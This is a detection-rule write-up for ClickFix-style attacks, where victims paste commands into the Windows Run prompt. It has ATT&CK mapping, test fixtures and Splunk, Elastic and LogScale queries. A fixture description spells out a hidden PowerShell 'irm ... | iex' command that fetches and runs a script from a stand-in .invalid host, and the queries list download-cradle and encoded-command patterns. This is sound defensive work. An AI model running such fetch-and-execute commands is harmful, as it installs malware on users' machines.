# Suspicious Process Spawning From Explorer Run Prompt (ClickFix Pattern)

## Goal

Identify suspicious process execution spawned directly by `explorer.exe` (indicative of Windows Run prompt invocation, shortcut manipulation, or user-assisted execution) where an interpreter or downloader utility is executed with download cradles, hidden window flags, or remote script parameters.

This bridges initial email/web delivery vectors (such as [`Suspicious_Active_Content_SVG_Attachment`](../../rules/yara/suspicious_active_content_svg.yar)) to endpoint host execution.

## Detection hypothesis

Legitimate users frequently open `powershell.exe` or `cmd.exe` from the Windows Run prompt (`Win + R`), but rarely include inline web download cradles (`irm`, `iwr`, `Invoke-WebRequest`, `Net.WebClient.DownloadString`), hidden execution flags (`-w hidden`, `-WindowStyle Hidden`), or base64-encoded command strings in the initial Run command.

Conversely, modern initial-access campaigns—notably **ClickFix**, **ClearFake**, **Marko**, and **FakeUpdate** (delivering Lumma Stealer, DarkGate, Amadey, or AsyncRAT)—rely on social engineering lures (e.g. fake Cloudflare CAPTCHAs, Teams/Chrome update errors) instructing the victim to:
1. Press `Win + R`
2. Press `Ctrl + V` (pasting an attacker-controlled command from the clipboard)
3. Press `Enter`

Because the victim executes the command through the Windows shell, the process tree originates directly from `explorer.exe`.

An event is flagged as high-fidelity suspicious when:
1. **Parent process:** `ParentImage` ends with `\explorer.exe`; AND
2. **Child process & argument combination:**
   - `powershell.exe` / `pwsh.exe` with download cmdlets (`irm`, `iwr`, `Invoke-RestMethod`, `Invoke-WebRequest`, `Net.WebClient`), hidden window flags (`-w hidden`), encoded command flags (`-enc`), or piped execution (`| iex`, `| Invoke-Expression`); OR
   - `mshta.exe` loading remote resources (`http://`, `https://`) or inline protocols (`javascript:`, `vbscript:`); OR
   - `curl.exe` or `certutil.exe` making outbound HTTP(S) requests; OR
   - `cmd.exe` staging background execution (`start /b`) to launch PowerShell, MSHTA, or Curl downloaders.

## Public basis

- Sekoia, "ClickFix: an ingenious social engineering technique" (June 2024): https://www.sekoia.io/en/clickfix-social-engineering-technique/
- Unit 42, "Threat Brief: ClickFix Social Engineering" (August 2024): https://unit42.paloaltonetworks.com/threat-brief-clickfix-social-engineering/
- Microsoft Threat Intelligence, "Adversaries continue to innovate initial access via user-assisted execution" (2024)
- Hoxhunt, "SVG Phishing Email Attachments" (October 2025): https://hoxhunt.com/blog/svg-phishing-email-attachments-mini-report

## ATT&CK mapping

- **T1204.002** — User Execution: Malicious File / Command
- **T1059.001** — Command and Scripting Interpreter: PowerShell
- **T1059.003** — Command and Scripting Interpreter: Windows Command Shell
- **T1218.005** — System Binary Proxy Execution: Mshta
- **T1027** — Defense Evasion: Obfuscated/Encoded Files or Information
- **T1105** — Command and Control: Ingress Tool Transfer

## Telemetry requirements

This detection relies on Windows Process Creation telemetry:
- **Sysmon:** Event ID 1 (`ProcessCreate`) with CommandLine logging enabled.
- **Windows Security Event Log:** Event ID 4688 (`A new process has been created`) with "Include command line in process creation events" enabled (Audit Process Creation policy).

## Fixtures

All fixtures are inert, synthetic JSON records located in `tests/fixtures/sigma/`. Remote URLs use RFC 2606 reserved `.invalid` names.

- **Positive fixtures (6):**
  - `clickfix_powershell_irm_iex.json`: Standard ClickFix lure payload (`powershell.exe -w hidden -c "irm https://payload-delivery.invalid/cdn/patch.ps1 | iex"`).
  - `clickfix_powershell_webclient_hidden.json`: `Net.WebClient` download string with hidden window.
  - `clickfix_powershell_encoded.json`: Base64 encoded PowerShell download command.
  - `clickfix_mshta_remote.json`: `mshta.exe http://update-service.invalid/auth/session.hta`.
  - `clickfix_curl_temp_exec.json`: `curl.exe` downloading a binary directly into `%TEMP%`.
  - `clickfix_cmd_powershell_staging.json`: `cmd.exe /c start /b powershell.exe -w hidden ...`.

- **Negative fixtures (6):**
  - `benign_explorer_powershell_interactive.json`: Standard interactive PowerShell launched via Run prompt.
  - `benign_explorer_cmd_interactive.json`: Standard interactive CMD launched via Run prompt.
  - `benign_explorer_notepad.json`: Plain desktop application launch (`notepad.exe`).
  - `benign_powershell_local_script.json`: Local script execution without remote downloads or hidden flags.
  - `benign_terminal_powershell_irm.json`: PowerShell download cradle spawned by Windows Terminal (developer CLI, not Explorer).
  - `benign_explorer_curl_help.json`: `curl.exe --help` executed from Run prompt.

## Measured results (2026-09-03)

Validated via automated regression suite (`tests/test_sigma_rules.py`):
- **Synthetic positives:** 6/6 matched (100% recall).
- **Synthetic negatives:** 0/6 matched (0% false positives).
- **Backend conversions:** 3/3 verified (Splunk SPL, Elasticsearch Lucene, CrowdStrike Falcon LogScale).

## SIEM / EDR query examples

### Splunk (SPL)

```spl
ParentImage="*\\explorer.exe" (Image IN ("*\\powershell.exe", "*\\pwsh.exe") CommandLine IN ("*Invoke-WebRequest*", "*iwr *", "*iwr(*", "*Invoke-RestMethod*", "*irm *", "*irm(*", "*Net.WebClient*", "*DownloadString*", "*DownloadFile*", "*-w hidden*", "*-windowstyle hidden*", "*-encodedcommand*", "*-enc *", "*| iex*", "*|iex*", "*| Invoke-Expression*")) OR (Image="*\\mshta.exe" CommandLine IN ("*http://*", "*https://*", "*javascript:*", "*vbscript:*")) OR (Image IN ("*\\curl.exe", "*\\certutil.exe") CommandLine IN ("*http://*", "*https://*")) OR (Image="*\\cmd.exe" CommandLine IN ("*powershell*", "*pwsh*", "*mshta*", "*curl*") CommandLine IN ("*start /b*", "*/c start*", "*-w hidden*", "*-windowstyle hidden*", "*-enc*", "*Invoke-*", "*irm *", "*iwr *", "*DownloadString*")) | table CommandLine,Image,ParentImage,User
```

### Elasticsearch (Lucene)

```lucene
ParentImage:*\\explorer.exe AND (((Image:(*\\powershell.exe OR *\\pwsh.exe)) AND (CommandLine:(*Invoke\-WebRequest* OR *iwr\ * OR *iwr\(* OR *Invoke\-RestMethod* OR *irm\ * OR *irm\(* OR *Net.WebClient* OR *DownloadString* OR *DownloadFile* OR *\-w\ hidden* OR *\-windowstyle\ hidden* OR *\-encodedcommand* OR *\-enc\ * OR *\|\ iex* OR *\|iex* OR *\|\ Invoke\-Expression*))) OR (Image:*\\mshta.exe AND (CommandLine:(*http\:\/\/* OR *https\:\/\/* OR *javascript\:* OR *vbscript\:*))) OR ((Image:(*\\curl.exe OR *\\certutil.exe)) AND (CommandLine:(*http\:\/\/* OR *https\:\/\/*))) OR (Image:*\\cmd.exe AND (CommandLine:(*powershell* OR *pwsh* OR *mshta* OR *curl*)) AND (CommandLine:(*start\\ \\/b* OR *\\/c\\ start* OR *\\-w\\ hidden* OR *\\-windowstyle\\ hidden* OR *\\-enc* OR *Invoke\\-* OR *irm\\ * OR *iwr\\ * OR *DownloadString*))))
```

### CrowdStrike Falcon (LogScale)

```logscale
ParentImage=/\\explorer\.exe$/i (Image=/\\powershell\.exe$/i or Image=/\\pwsh\.exe$/i CommandLine=/Invoke-WebRequest/i or CommandLine=/iwr /i or CommandLine=/iwr\(/i or CommandLine=/Invoke-RestMethod/i or CommandLine=/irm /i or CommandLine=/irm\(/i or CommandLine=/Net\.WebClient/i or CommandLine=/DownloadString/i or CommandLine=/DownloadFile/i or CommandLine=/-w hidden/i or CommandLine=/-windowstyle hidden/i or CommandLine=/-encodedcommand/i or CommandLine=/-enc /i or CommandLine=/\| iex/i or CommandLine=/\|iex/i or CommandLine=/\| Invoke-Expression/i) or (Image=/\\mshta\.exe$/i CommandLine=/http:\/\//i or CommandLine=/https:\/\//i or CommandLine=/javascript:/i or CommandLine=/vbscript:/i) or (Image=/\\curl\.exe$/i or Image=/\\certutil\.exe$/i CommandLine=/http:\/\//i or CommandLine=/https:\/\//i) or (Image=/\\cmd\.exe$/i CommandLine=/powershell/i or CommandLine=/pwsh/i or CommandLine=/mshta/i or CommandLine=/curl/i CommandLine=/start \/b/i or CommandLine=/\/c start/i or CommandLine=/-w hidden/i or CommandLine=/-windowstyle hidden/i or CommandLine=/-enc/i or CommandLine=/Invoke-/i or CommandLine=/irm /i or CommandLine=/iwr /i or CommandLine=/DownloadString/i)
```

## Known limitations

1. **Alternate LOLBins:** Adversaries may use less common binaries (`rundll32.exe`, `regsvr32.exe`, `cscript.exe`) or Windows Subsystem for Linux (`wsl.exe`, `bash.exe`) to execute payloads from the Run dialog.
2. **Obfuscated / Fragmented Commands:** String splitting, caret insertion (`c^m^d`), environment variable expansion, or PowerShell format operator tokens (`{0}{1}` -f ...) can evade string-matching detection in process creation logs without script block logging.
3. **Execution via Alternative Parents:** If the victim is instructed to paste into a pre-existing terminal window or third-party launcher (e.g. PowerToys Run, Alfred, Keypirinha), `ParentImage` will not be `explorer.exe`.
4. **Complementary Telemetry:** This rule should be layered with:
   - PowerShell Script Block Logging (Event ID 4104) to capture deobfuscated payload contents.
   - Registry monitoring on `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` (Sigma: `registry_set_potential_clickfix_execution.yml`).
   - Network connection telemetry (Sysmon EID 3) correlating endpoint outbound web requests directly following shell execution.

## Reproducing the tests

```powershell
python -m unittest tests/test_sigma_rules.py -v
```
